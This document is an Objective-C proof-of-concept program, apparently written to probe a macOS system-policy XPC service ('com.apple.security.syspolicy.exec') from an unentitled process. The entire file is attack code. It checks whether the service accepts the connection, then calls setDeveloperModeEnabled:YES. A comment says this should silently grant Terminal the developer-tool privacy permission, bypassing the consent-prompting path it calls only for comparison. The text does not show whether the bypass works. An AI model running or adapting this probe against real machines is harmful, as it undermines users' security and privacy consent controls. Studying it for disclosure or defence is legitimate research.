#import <Foundation/Foundation.h>
@protocol ExecManagerRemote
- (void)doGatekeeperProgressUpdate:(long long)a withTotal:(long long)b;
@end
@protocol ExecManager
- (void)isDeveloperModeEnabledWithReply:(void(^)(BOOL enabled, NSError *err))reply;
- (void)setDeveloperModeEnabled:(BOOL)enabled withReply:(void(^)(BOOL ok, NSError *err))reply;
- (void)requestDeveloperToolAccessWithReply:(void(^)(BOOL ok, NSError *err))reply;
@end
@interface Cb : NSObject <ExecManagerRemote> @end
@implementation Cb - (void)doGatekeeperProgressUpdate:(long long)a withTotal:(long long)b {} @end
int main(){ @autoreleasepool {
  NSLog(@"[*] uid=%d (unentitled)", getuid());
  NSXPCConnection *c=[[NSXPCConnection alloc] initWithMachServiceName:@"com.apple.security.syspolicy.exec" options:0];
  c.remoteObjectInterface=[NSXPCInterface interfaceWithProtocol:@protocol(ExecManager)];
  c.exportedInterface=[NSXPCInterface interfaceWithProtocol:@protocol(ExecManagerRemote)];
  c.exportedObject=[Cb new];
  __block BOOL inval=NO;
  c.invalidationHandler=^{ inval=YES; NSLog(@"[!] INVALIDATED(rejected)"); };
  c.interruptionHandler=^{ NSLog(@"[!] INTERRUPTED"); };
  [c resume];
  dispatch_semaphore_t s=dispatch_semaphore_create(0);
  id r=[c remoteObjectProxyWithErrorHandler:^(NSError*e){ NSLog(@"[xpc-err] code=%ld", (long)e.code); dispatch_semaphore_signal(s); }];
  NSLog(@"[1] isDeveloperModeEnabledWithReply: (read-only)...");
  [r isDeveloperModeEnabledWithReply:^(BOOL en, NSError*e){ NSLog(@"[1>] REACHABLE: isDeveloperModeEnabled=%d err=%@ (unentitled uid501 ACCEPTED + replied)", en, e); dispatch_semaphore_signal(s); }];
  dispatch_semaphore_wait(s, dispatch_time(DISPATCH_TIME_NOW, 8*NSEC_PER_SEC));
  NSLog(@"[2] setDeveloperModeEnabled:YES (should grant Terminal kTCCServiceDeveloperTool on enable)...");
  [r setDeveloperModeEnabled:YES withReply:^(BOOL ok, NSError*e){ NSLog(@"[2>] setDeveloperModeEnabled reply ok=%d err=%@", ok, e); dispatch_semaphore_signal(s); }];
  dispatch_semaphore_wait(s, dispatch_time(DISPATCH_TIME_NOW, 8*NSEC_PER_SEC));
  NSLog(@"[3] requestDeveloperToolAccessWithReply: (the consenting sibling, for comparison)...");
  [r requestDeveloperToolAccessWithReply:^(BOOL ok, NSError*e){ NSLog(@"[3>] requestDeveloperToolAccess ok=%d err=%@", ok, e); dispatch_semaphore_signal(s); }];
  dispatch_semaphore_wait(s, dispatch_time(DISPATCH_TIME_NOW, 6*NSEC_PER_SEC));
  sleep(1); NSLog(@"[*] done inval=%d", inval);
  return 0;
}}
